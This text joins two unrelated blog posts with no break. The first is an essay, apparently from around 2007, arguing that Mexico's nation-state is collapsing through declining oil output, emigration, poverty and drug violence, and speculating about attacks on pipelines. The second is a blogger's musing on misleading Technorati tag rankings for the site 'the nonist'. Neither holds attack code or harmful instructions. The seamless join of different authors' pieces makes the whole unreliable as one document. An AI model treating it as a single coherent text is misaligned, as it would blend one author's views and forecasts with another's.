The collapse of Mexican oil production has been extensively discussed elsewhere — here it is only my aim to highlight this as a component in the collapse of the Mexican Nation - State , and the positive feedback loops between the two events .
Mexico ’s National and State Boundaries are Separating
The core proposition of a Nation - State is that the boundaries of the Nation and the State will coincide , allowing the State to effectively provide for the security and welfare of the Nation , and leading in return to the Nation giving their allegiance to the State ( See Philip Bobbitt 's " Shield of Achilles , " the seminal work on the Nation - State construct ) .
While no Nation - State is a perfect example of this ideal , Mexico ’s proximity to enticing US labor markets , and the resulting massive emigration of Mexicans , is increasingly distorting this overlap .
While “ Mexico ” remains a powerful cultural concept , that concept is increasingly dissociated with the geographic borders of the Mexican state .
People can be wholly “ Mexican ” in Los Angeles , or , increasingly , Alabama .
The State of Mexico is Failing to Provide for its Nation
While the dissociation of the boundaries of a Nation with the borders of a State makes it more difficult for a notional Nation - State to provide for that part of its Nation outside its State borders , Mexico is also failing to provide for its nationals inside its borders .
Recent protests over tortilla prices are just one example of the extreme poverty suffered by much of the nation ( and , not entirely coincidentally , largely the result of scarcity in global oil markets driving demand for corn-ethanol ) .
Similarly , while the average Mexican ’s wealth is increasing , there are shadow factors at work — people like the Mexican businessman Carlos Slim , now the richest man in the world at $ 68 Billion net worth , are skewing the statistics .
Without remittance payments from emigrants , Mexico 's poverty situation would be far worse .
When a State can no longer provide for its Nation , there is no longer any incentive for that Nation to voluntarily give allegiance and support to their State .
The only remaining tool to exert control is coercion through a State ’s theoretical monopoly on violence , and in Mexico even that is breaking down .
Mexico ’s Monopoly on Violence is Collapsing
Not that Mexico was ever a poster - child for civic safety and effective policing , but the situation has grown considerably worse in the past year .
There are mass desertions among the federal police .
Outright infantry battles between crime organizations and the government are becoming a common occurrence .
Hundreds , perhaps thousands , of police , judges , government officials , and reporters have been assassinated over the past few years .
What control the federal government continues to exercise in states such as Sonora , Sinaloa , and Nuevo Leon is mainly due to the fact that crime organizations do n’t want to actually take over the territory — they already experience the benefits of acting as a sovereign government without the burdens , and they ’re happy to leave those burdens to the “ official ” government .
Can Mexico Protect Its Oil Infrastructure ?
Mexico 's increasing inability to deal with drug violence within its own borders begs the question : can Mexico protect its oil infrastructure ?
A string of attacks on Mexican gas pipelines this week suggest that they are ill - prepared for this threat .
Photo : Flames from the attack on a gas pipeline in Queretaro , Mexico illuminate a passing army truck .
( AP )
The same profit motivation that increasingly drives attacks on oil infrastructure in Nigeria and Iraq is tailor - made for the combination of disaffected rebels and powerful criminal organizations that already exist in Mexico .
The chief source of revenue from oil attacks in Nigeria is the ransoming of foreign contractors working in the oil sector .
The more that Mexico succeeds in modifying its constitution to bring foreign service workers and foreign concession - holders into its oil and gas industry , this same problem could spring up with a fury in Mexico .
Similarly , the high return on investment for attacks on Mexico 's oil industry make this the most promising target for politically motivated groups .
Finally , while " illegal bunkering " -- poor consumers stealing various hydrocarbons direct from production pipelines -- is not yet a common occurrence in Mexico , " Export - Land " effects will likely make domestic consumers , especially rural and poor consumers , feel a financial crunch that will drive bunkering .
Mexico 's military and police forces have , to put it mildly , not demonstrated much competence over the past decades .
The same corruption , desertion , and competing interests that are causing the Mexican state to lose its monopoly over violence will prevent Mexico from effectively protecting its oil infrastructure .
The simultaneous ( and partially resulting ) financial crunch will further degrade their ability to respond .
How long until we hear that " oil rose in New York today on news of continued attacks on oil facilities in Mexico " ??
Collapse is a Positive Feedback Loop
Every one of these factors , individually and in combination , act as positive feedback loops .
Collapsing oil production decreases available revenues to reinvest in exploration and delays bringing new fields to production .
The comparative success of Mexicans outside of Mexico drives further emigration .
Failure of the Mexican government to provide for its people drives more economic activity to the black market , erodes the tax base , and makes taxes more difficult to justify at election time .
And failure of the government to provide for fundamental security compels the population to turn to primary loyalties for protection — corrupt local governments , criminal organizations , etc .
These factors in combination erode the foundation of the rule of law and the viability of Mexico ’s infrastructure network , which in turn puts the brake on foreign investment , tourism , and the ability of legitimate businesses to produce and export goods and services from within Mexico .
To the extent that Mexico uses central banking to prop up the peso , it drives a wedge between actual , local economic production and the monetized economy .
Is Mexico a unique case or a bellwether ?
In my paper The New Map , I argue that these same factors are eroding the viability of the Nation - State everywhere .
The situation in Mexico is exacerbated by reliance on declining oil revenues and proximity to the US .
However , the Mexican Nation - State enjoys many advantages : with significant exceptions , indigenous populations are well integrated into Mexican culture ; a strong , shared Catholic identity ; a rich history as an independent nation ; a relatively long period of independence since the end of colonial control .
Nigeria , Iraq , and other fragmenting Nation - States would be lucky to have even one of those advantages .
Every Nation - State is the product of unique circumstances , but the broader forces undermining the Mexican Nation - State are shared around the world .
The decline of the Mexican Nation - State is most visible because of the impact of symptoms of this decline on the US , and the resulting media coverage of these symptoms : America ’s “ broken borders , ” the “ war on drugs , ” the “ outsourcing of America , ” and virtually anything else that comes out of Lou Dobbs ’ mouth ( a “ rise ” in leprosy due to Mexican immigrants — look out ! ) .
The collapse of the Mexican Nation - State will have serious , negative impacts on global oil markets , on the US economy , and on xenophobia and anti-immigrant sentiment in the US , not to mention its impacts inside Mexico .
It might not happen in 2007 — and it certainly wo n’t occur in one sudden “ bang ” that can be easily marked on a date in history — but the process is already well under way .
On a broader trend , the decline of the Nation - State as a mode of social organization will have profound effects in a post - peak world .
In one sense it will cement the inability of Nation - State governments , and international coalitions of governments , to act effectively to address Peak Oil .
In another sense , it may facilitate exactly the kind of localization that will be necessary in a low - energy world .
Of course , this is n’t a suggestion that the transition will be peaceful , enjoyable , or brief .
a case study in the illusions of blogging
yesterday i did some minor maintenance on my technorati account .
i logged in to change a couple of tags around to better fit the site ’s content as it has shaped up in the last year .
we do evolve after all .
while there i could n’t resist the urge to click each tag and see where i stood in the technoratic scheme of things .
the results were kind of funny and got me thinking , yet again , about the realities of blogging as compared to the number - driven illusions and mutually reinforcing delusions .
consider the following a sort of case study in the illusions of blogging .
so - technorati , the popular ranking / tracking / tagging service which many of us bloggers look to for some insight into our place in the blogoshpere , allows each blog 20 overarching tags with which to sum up general slant and content .
each of those 20 tags can be used to search out similar content and serves to place each blog in thematic relation to all the millions of others .
the following rankings are by tags which i’ve chosen to sum up the nonist and were taken from technorati yesterday -
first lets get a chunk of the data out of the way in one swoop .
for each of the following headings the nonist is ranked as the # 1 result :
fiction
humanism
ideas
observations
skeptic
belief
i must say that i find this fairly disconcerting .
this means that overall the nonist is the top ranking blog for over a quarter of the 20 tags i’ve chosen to reflect it .
if you look closely at the tags you ’ll see that most are fairly broad , but i have to ask myself is the nonist really an appropriate choice to represent fiction , humanism , or skepticism in technorati ’s cosmos ?
i try to write a bit of fiction each week , i believe whole heartedly in humanism , and am rather skeptical in general , but i have to believe there are sites with a more focussed viewpoint which people searching for said subjects deserve to see first .
the following results perhaps illustrate this more clearly :
philosophy :
1. tcs daily
2. the nonist
history :
1. Informed Comment
2. urban legends about.com
3. the nonist
books :
1. blogcritics.org
2. pop matters
3. neil gaiman
4. professor brainbridge
5. the nonist
well … certainly i’m interested in looking at most of my chosen content in a philosophical way , i post many items of historical interest i suppose , and i refer to , quote from , and scan books often , but in all these cases the inclusion of the nonist seems somewhat misleading no ?
here ’s another good example -
arts :
1. the new york review of books
2. the nonist
3. bldgblog
now take that in for a moment .
the nonist ranks just below the n.y review of books , which makes sense , but above bldgblog which seems wrong .
i can go for days without mentioning the arts at all where as bldgblog is well focussed .
the pattern of illusion begins to be evident .
now look at these -
design :
1. kottke.org
12 . the nonist
17 . design observer
writing :
3. neil gaiman
6. the nonist
16 . words for my enjoyment
25 . double tongued word wrester
29 . if : book
and
science :
1. pharyngula
2. tcs daily
3. the nonist
4. science Blog
5. the panda ’s thumb
in the design category i think it ’s important to note where design observer falls .
to my mind design observer is the most sophisticated and enjoyable site out there focussed on design .
it ’s arguable whether kottke is actually strongly focussed on design and i can say for sure that the nonist , though design “ interested , ” is by no measure a blog “ about ” design .
( i do that evil shit all day and would rather not dwell on it . )
in the writing category you ’ll notice the crazy cross-section which all sit under it ’s umbrella .
gaiman who is a world renown author , double tongued word wrester which is a wonderful etymological site , if : book which is broadly focussed on the culture of books , and those other two .
now the nonist is at 6 and words for my enjoyment is 16 even though pauly offers a new piece of creative writing every single day without fail ( he ’s a professional writer after all ) and has a very lively readership which masses 25 - 35 comments regularly on every post .
meanwhile the posts here which i would characterize as “ writing proper ” are consistently the least commented upon .
this tells me our readers do not necessarily come here for writing .
in the science category i can’t help but just laugh .
pharyngula , science blog , and panda ’s thumb , must cringe whenever they see this site ’s inclusion among them .
they are admirable , serious , sites with a proper science pedigree , where as i manipulate photo’s of darwin , prattle on about space , and post the blurbs i find of interest in the sidebar .
how can i be wedged there between them ?!
i ’ll let you all in on a little secret now which goes a long way toward explaining things -
the nonist is highly ranked on the strength of no more than 3 or 4 extremely popular posts .
sure we have a home in many sidebars but not nearly as many as the numbers would seem to reveal .
the “ nonist public service pamphlet ” on blog depression has been , without question , the single biggest key to the sites wider dissemination .
but how many of those linking the pamphlet , or following links , have been return visitors ?
meanwhile our referrer logs continue , months and months on , to show a high concentration of links pointing toward “ the erotic coloring book ” and “ making love in 1975 . ” of all the nuggets unearthed and all the original content crafted the fact that these two silly posts continue to draw such a large share of attention , owing entirely to their quasi - sexual content , is , if i’m being honest , disheartening .
in essence this begs the question , how many of the 1,739 links pointing to the nonist represent an actual readership ?
also , does a blog with a handful of popular posts deserve to rank so high ?
and finally , is this method of putting blogs in perspective even remotely accurate in representing the actual blog landscape ?
to that last question i’d have to answer no .
at least not from my perspective .
take a look at the ranking for the following tag -
eclectic :
1. boing boing
2. the nonist
in my mind “ eclectic ” might be the single most accurate tag i use in my technorati account to sum up the nonist , it is nothing if not eclectic , so a ranking of number two on that tag is actually fairly gratifying .
searching “ eclectic ” and being given this result might lead one to draw corollaries however - “ ah boing boing is huge , the “ nonist ” must be comparable somehow … ”
but now take a look at those over all linking numbers -
1. boing boing .
over all - 67,731 links from 19,764 sites
2. the nonist .
over all - 1,739 links from 895 sites
not exactly comparable are they ?
in truth boing boing is the blogoshpere ’s version of a superpower where as the nonist is akin to a small pacific island whose indigenous peoples still wear loincloths and have never seen a porsche , which is to say almost totally unknown .
or let me put it into more topical terms - if boing boing were to start a preemptive war against another blog , at best the nonist might be listed among the “ coalition of the willing , ” not because we have an army , but because we donated a single bomb - sniffing mollusk to the effort .
now you might be thinking that i’m being unfairly ( or even insincerely ) self - deprecating with all this , but really i’m just trying to illustrate a point .
if services like technorati ( each blogger has his favored service ) are not in fact representative of the landscape and the numbers themselves do n’t really signify much concretely , then what is the purpose ?
or more specifically , why do bloggers watch over the rankings and numbers and referrer logs so closely ?
when the nonist was at it ’s ranking peak , somewhere around 400 overall on technorati , things were no different than they are today , when we have dropped down to around 800 ( and still falling ) .
the experience from my point of view was ( with the exception of a few months worth of higher hosting bills ) the same .
this precipitous rise and subsequent fall did not effect the site in any palpable way .
so why then do i continue to look at the numbers ?
why do i still check technorati each morning and my referrer logs a couple times each day ?
simple - because the illusion of accomplishment which the numbers provide is the only reflection of success or failure available to me .
i have no advertising on the site , so i can not gauge popularity or achievement by my ad - sense revenue .
i do not offer a specific product or service , the sale and popularity of which i could look to as a reflection of my efforts .
i have not as of yet tried to parlay the site ’s ( possible ) popularity into any other opportunities .
in short i do not have at my disposal any of the traditional measuring sticks with which to gauge accomplishment .
where as the creators of sites which , directly or indirectly , take in profits can look to them as a marker , i am obliged to look at traffic like a store owner who does not actually sell anything so instead reviews the security camera footage from above the front door a few times a day to be sure someone showed up .
services like technorati offer bloggers like me ( of which there are millions ) a point of reference , illusory though it may ultimately be .
these are not complaints , merely observations .
i could after all load up the site with ads .
that ’s my prerogative .
but i’ve chosen not to .
which brings me back to points i’ve touched on many times already , both satirically and sincerely .
why do we blog ?
what do we hope to accomplish ?
how will we know when we ’ve succeeded ?
i ’m willing to bet that the lion ’s share of those blogging right now have no idea why they blog .
having started out of curiosity they are now simply compelled .
if asked they might answer “ because it ’s fun ! ” though i’d have to retort that if the popularity of the “ blog depression pamphlet ” proved anything it ’s that blogging is not always fun .
it ’s work .
so again i ask , why do we blog ?
the highly successful “ superpowers ” of blogging likely do n’t ask the question anymore .
there ’s no need .
they probably do n’t bother to check their stats and referrers nearly as often either .
( can you imagine cory or mark over of boing boing waking up each morning and logging on to technorati to see if anyone has linked them ? haha. i can ’t. ) they have concrete evidence of their success which make the illusory popularity contest of technorati and similar services superfluous .
perhaps for the “ non-profits ” that is the ultimate badge of success - disinterest in rank .
for the rest of us though the illusion is all we have by way of external reward .
for me personally comments , emails , involvement , and conversation of any kind is the highest reward , but failing those at least i can see when someone in poland thought enough of a post to link it .
that ’s gratifying as well .
the act of compulsively looking to technorati proves i’m not quite a success .
on the other hand the numbers there seem to imply that neither is this enterprise unsuccessful .
of course i’m a realist , and the crazy tag rankings above which place us in with pharyngula , kottke , neil gaiman , the panda ’s thumb , the n.y review of books , and boing boing , actually diminish my pleasure a bit because i know that , appearances aside , we are not at that level of popularity .
we are in fact a small blog with a modest readership which can use all the help it can get .
which is to say those monoliths listed are not our peers , gratifying though the illusion may be .
lastly let me just leave you with this bit of tagging zen , take from it what you will -
as of yesterday technorati offered the following rankings :
truth
1. the brad blog
2. the nonist
lies
1. the nonist
